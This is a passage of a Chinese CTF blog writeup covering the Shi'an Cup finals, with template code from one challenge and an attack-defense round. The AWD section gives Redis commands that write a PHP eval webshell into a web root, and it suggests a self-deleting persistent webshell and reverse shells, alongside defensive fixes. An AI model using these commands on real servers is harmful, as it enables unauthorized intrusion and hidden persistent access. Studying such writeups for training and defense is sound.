          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"jn-img f-left"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#"</span><span class="na">QS_newslist</span><span class="err">,</span><span class="na">id:</span><span class="err">$</span><span class="na">newscategory</span><span class="err">[</span><span class="na">nclist</span><span class="err">].</span><span class="na">id</span><span class="err">"|</span><span class="na">qishi_url#</span><span class="err">}"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>![]({#$QISHI.site_template#}images/news{#$smarty.section.nclist.index#}.jpg)<span class="nt">&lt;/a&gt;&lt;/div&gt;</span>
          <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"jn-list f-left"</span><span class="nt">&gt;</span>
          {#qishi_news_list set="列表名:topnews,显示数目:4,标题长度:18,资讯小类:$newscategory[nclist].id,摘要长度:36,填补字符:...,排序:id&gt;desc"#}
          {#foreach from=$topnews item=toplist#}
          <span class="nt">&lt;li&gt;&lt;i</span> <span class="na">class=</span><span class="s">"jn-icon"</span><span class="nt">&gt;&lt;/i&gt;&lt;a</span> <span class="na">target=</span><span class="s">"_blank"</span> <span class="na">href=</span><span class="s">"{#$toplist.url#}"</span> <span class="na">class=</span><span class="s">"underline"</span> <span class="na">title=</span><span class="s">"{#$toplist.title_#}"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$toplist.title#}<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
          {#/foreach#}
          <span class="nt">&lt;/ul&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
        {#/section#}
      <span class="nt">&lt;/div&gt;</span>
      <span class="nt">&lt;ol</span> <span class="na">class=</span><span class="s">"jn-right f-left"</span><span class="nt">&gt;</span>
        {#qishi_news_list set="列表名:news_list,显示数目:8,标题长度:12,填补字符:...,排序:click&gt;desc"#}
        {#section loop=$news_list name=nclist start=1#}
        <span class="nt">&lt;li&gt;&lt;span&gt;</span>{#$smarty.section.nclist.index#}<span class="nt">&lt;/span&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$news_list[nclist].url#}"</span> <span class="na">class=</span><span class="s">"underline"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$news_list[nclist].title#}<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
        {#/section#}
      <span class="nt">&lt;/ol&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
  <span class="c">&lt;!-- 列表-职场资讯结束 --&gt;</span>
  <span class="c">&lt;!-- 列表-友情链接 --&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"index-data-wrap"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"blue-line"</span><span class="nt">&gt;&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"data-title-box clearfix"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;h4</span> <span class="na">class=</span><span class="s">"f-left"</span><span class="nt">&gt;</span>友情链接<span class="nt">&lt;span&gt;</span>Friendly Link<span class="nt">&lt;/span&gt;&lt;/h4&gt;</span>
      <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#$QISHI.site_dir#}link/add_link.php"</span> <span class="na">target=</span><span class="s">"_blank"</span>  <span class="na">class=</span><span class="s">"f-right underline"</span><span class="nt">&gt;</span>申请&gt;&gt;<span class="nt">&lt;/a&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"friendly-link"</span><span class="nt">&gt;</span>
      {#qishi_link set="列表名:link,显示数目:100,调用名称:QS_index,类型:1"#}
      {#foreach from=$link item=list#}
      <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.link_url#}"</span> <span class="na">target=</span><span class="s">"_blank"</span> <span class="na">class=</span><span class="s">"underline"</span><span class="nt">&gt;</span>{#$list.title#}<span class="nt">&lt;/a&gt;</span>
      {#/foreach#}
    <span class="nt">&lt;/div&gt;</span>
    {#qishi_link  set="列表名:imglink,显示数目:14,调用名称:QS_index,类型:2"#}
    {#if $imglink#}
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"link_img"</span><span class="nt">&gt;</span>
      {#foreach from=$imglink  item=list#}
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"l_img"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.link_url#}"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>![]({#$list.link_logo#})<span class="nt">&lt;/a&gt;</span> <span class="nt">&lt;/div&gt;</span>
      {#/foreach#}
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"clear"</span><span class="nt">&gt;&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    {#/if#}
    <span class="nt">&lt;/div&gt;</span>
  <span class="c">&lt;!-- 列表-友情链接结束 --&gt;</span>
<span class="nt">&lt;/div&gt;</span>
<span class="c">&lt;!-- 主体结束 --&gt;</span>
{#include file="footer.htm"#}

<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<h4 id="第三题easycms">第三题easyCMS</h4>
<ul>
  <li>这题也是服务器设置不当导致部分目录遍历</li>
  <li>进入templates/admin目录时发现title为flag</li>
  <li>这题没啥思路了Orz。。。。希望大佬们能解答一下。。。</li>
</ul>

<hr />

<h4 id="下午的awd不出所料又是一道web题">下午的AWD不出所料又是一道Web题</h4>

<p>但是围绕这个Web题主办方开放了三个服务，分别是80端口的http服务，8888端口的由python跑的http服务，6379端口的redis服务
这里三个服务都各有一个洞（赛后询问主办方得知）
根据主办方的赛前公告 getflag的方法是运行位于/usr/tmp目录下的getkey程序即可打印出flag，但是赛后问出题人其实还有另外一个地方有明文flag。。。。。。</p>

<ul>
  <li>
    <p>首先80端口的一个Drupal反序列漏洞 ，链接 <a href="https://paper.seebug.org/334/?spm=5176.app55885.3.2.XT8Apf">https://paper.seebug.org/334/?spm=5176.app55885.3.2.XT8Apf</a>
 <strong><em>防御方法：及时修改admin密码</em></strong></p>
  </li>
  <li>
    <p>其次8888端口是ffmpeg的任意文件读取漏洞，emmm其实不知道这个有啥用。。。但是后来问出题人。。他说本来他也没想到这样用的。。因为其实服务器中还mount了一个虚拟硬盘，里面有明文的flag，所以可以用这个直接读取。。。。//但是个人觉得这个洞。。。。貌似根本补不了，没有这个权限。。。所以emmmmm 大家应该懂
<strong><em>防御方法：其实这个洞后来想了一下。。。可以写脚本无限访问del去删除，但是这个存在一个竞争的问题，因为操作机与别人攻击的机器是处于水平网络上的，所以如果对面也写脚本请求的话不一定能竞争成功。。</em></strong></p>
  </li>
  <li>
    <p>最后是6379端口的redis服务，我是拿了这个洞来打的。。。今天下午又犯蠢了。。ps aux发现redis之后很开心，兴冲冲连上去发现不用密码，输入info命令可以看到redis的配置文件位于 /var/lib/redis/6379/xxx 然后查看自己的配置文件发现有几个命令是被rename或者是移除的，比如migrate flushdb之类的 然后config命令被rename成了ccccooonnnnfig，shutdown被rename成了shutdown_123，然后加了自己的登录密码，自作聪明的上去把绝大多数人的redis down了，想着能美滋滋的收分。。。。。但是突然意识到这个awd是没有checker的！！！！崩溃Orz。。。后来发现甚至有人把自己的80端口的服务都down掉了（不知道他们是如何做到的，因为不提权的话根本不会有权限） 其实这里是可以用redis来进行任意文件写， 因为redis是用root权限运行的，而redis有一个save备份自身的kv对到文件的功能，也就是说，我可以执行以下命令来进行写shell</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> ccccooonnnnfig <span class="nb">set dir</span> /var/www/html/drupal8/
<span class="o">&gt;</span> ccccooonnnnfig <span class="nb">set </span>dbfilename Pr0ph3t.php
<span class="o">&gt;</span> <span class="nb">set </span>Pr0ph3t <span class="s2">"&lt;?php @eval(</span><span class="nv">$_POST</span><span class="s2">['yoooooo']); ?&gt;"</span>
<span class="o">&gt;</span> save
</code></pre></div></div>

<p>save命令执行之后 redis将会在80网站部署根目录下生成一个内容带有Redis字样的Pr0ph3t.php的文件
然后反弹shell之类的，权限为deamon用户
这里推荐写一个unlink自身的不死马，不会暴露是通过Redis服务写的shell
<strong><em>防御方法：开启redis的密码 以下命令</em></strong></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">&gt;</span> ccccooonnnnfig <span class="nb">set </span>requirepass 你的密码
</code></pre></div></div>

<p>此命令设置后不用重启服务即可生效</p>

<p>相关资料：<a href="https://www.leavesongs.com/penetration/write-webshell-via-redis-server.html">https://www.leavesongs.com/penetration/write-webshell-via-redis-server.html</a></p>

<hr />

<p>写在最后：
其实这次比赛体验。。。大家心里都应该会有数。。。。。就不多说了。。。。</p>

  </article>

	<p class="feed-recomendation">
		Did you like the post? Subscribe to the <a href="/feed/">feed</a>.
	</p>

  <div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES * * */
    var disqus_shortname = 'pr0ph3t';
    var disqus_config = function () {
        this.page.identifier = "/posts/%E4%B8%96%E5%AE%89%E6%9D%AF-%E5%86%B3%E8%B5%9BWriteup/";
    };
    
    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>




</div>

  </article>

</div>

            </main>
          </div>
        </div>

        <div class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <footer>
      Thx!
    </footer>
  </div>
</div>
<script src="https://libs.cdnjs.net/jquery/3.3.1/jquery.min.js"></script>
<script src="https://libs.cdnjs.net/fancybox/3.5.7/jquery.fancybox.min.css"></script>
<script>
$(document).ready(function() {
	$("img").each(function() {
		var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
		$(this).wrapAll(strA);
    });
});
</script>
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-87275583-1']);
  _gaq.push(['_trackPageview']);
 (function() {
   var ga = document.createElement('script');ga.type = 'text/javascript'; ga.async = true;
   ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
   var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>

  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
  <script>
    AV.initialize("FUf6n3OvGTkv0cqnGGbJyS5Q-MdYXbMMI", "FV3i9cojG6DyOMel86rUaaqR");
    AV.useAVCloudUS();
    //新增访问次数
    function addCount(Counter) {
      // 页面（博客文章）中的信息：leancloud_visitors
      // id为page.url， data-flag-title为page.title
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      // 只根据文章的url查询LeanCloud服务器中的数据
      query.equalTo("post_url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {//说明LeanCloud中已经记录了这篇文章
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("visited_times");// 将点击次数加1
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                var newTimes = counter.get('visited_times');
                $element.find('.leancloud-visitors-count').text(newTimes);
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            // 执行这里，说明LeanCloud中还没有记录此文章
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("post_title", title);// 把文章标题
            newcounter.set("post_url", url); // 文章url
            newcounter.set("visited_times", 1); // 初始点击次数：1次
            newcounter.save(null, { // 上传到LeanCloud服务器中
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                var newTimes = newcounter.get('visited_times');
                $element.find('.leancloud-visitors-count').text(newTimes);
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    //仅根据url和title查出当前访问次数，不做+1操作
    function showCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      // 只根据文章的url查询LeanCloud服务器中的数据
      query.equalTo("post_url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {//说明LeanCloud中已经记录了这篇文章
            var counter = results[0];
            var $element = $(document.getElementById(url));
            var newTimes = counter.get('visited_times');
            $element.find('.leancloud-visitors-count').text(newTimes);
          } else {
            //如果表里没查到记录，那就是异常情况了
            console.log('异常情况，不应该没记录的');
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    //调用API获取IP
    function getVisitorIpAndJudge() {
      var ip;
      var options = {
        type: 'GET',
        url: "https://ctf.pr0ph3t.com/"
      };
      $.ajax(options)
      .done(function(data, textStatus, jqXHR) {
        if(textStatus == "success") {
          ip = data.trim().split('<br>')[0];
        }
        judgeVisitor(ip)
      });
    }

    //判断访客是否已访问过该文章，及访问时间，符合条件则增加一次访问次数
    function judgeVisitor(ip) {
      var Counter = AV.Object.extend("visited_times");
      var Visitor = AV.Object.extend("visitors_record");

      var $postInfo = $(".leancloud_visitors");
      var post_url = $postInfo.attr('id').trim();

      var query = new AV.Query(Visitor);

      query.equalTo("visitor_ip", ip);
      query.equalTo("post_url", post_url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            console.log('该IP已访问过该文章');

            var oldVisitor = results[0];

            var lastTime = oldVisitor.updatedAt;
            var curTime = new Date();

            var timePassed = curTime.getTime() - lastTime.getTime();

            if(timePassed > 1 * 60 * 1000) {
              console.log('距离该IP上一次访问该文章已超过了1分钟，更新访问记录，并增加访问次数');

              addCount(Counter);

              oldVisitor.fetchWhenSave(true);
              oldVisitor.save(null, {
                success: function(oldVisitor) { },
                error: function(oldVisitor, error) {
                  console.log('Failed to save visitor record, with error message: ' + error.message);
                }
              });
            } else {
              console.log('这是该IP 1分钟内重复访问该文章，不更新访问记录，不增加访问次数');
              showCount(Counter);
            }
          } else {
            console.log('该IP第一次访问该文章，保存新的访问记录，并增加访问次数');

            addCount(Counter);

            var newVisitor = new Visitor();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newVisitor.setACL(acl);
            newVisitor.set("visitor_ip", ip);
            newVisitor.set("post_url", post_url);
            newVisitor.save(null, { // 上传到LeanCloud服务器中
              success: function(newVisitor) { },
              error: function(newVisitor, error) {
                console.log('Failed to create visitor record, with error message: ' + error.message);
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
          addCount(Counter);
        }
      });
    }

    $(function() {
      if ($('.leancloud_visitors').length == 1) {
        // 文章页面，调用判断方法，对符合条件的访问增加访问次数
        getVisitorIpAndJudge();
      } else if ($('.post-link').length > 1){
        // 首页 暂未使用
        // showHitCount(Counter);
      }
    });
  </script>

<!-- <script type="text/javascript" src="/assets/js/images.js"></script> -->

      </div>
    </body>
</html>
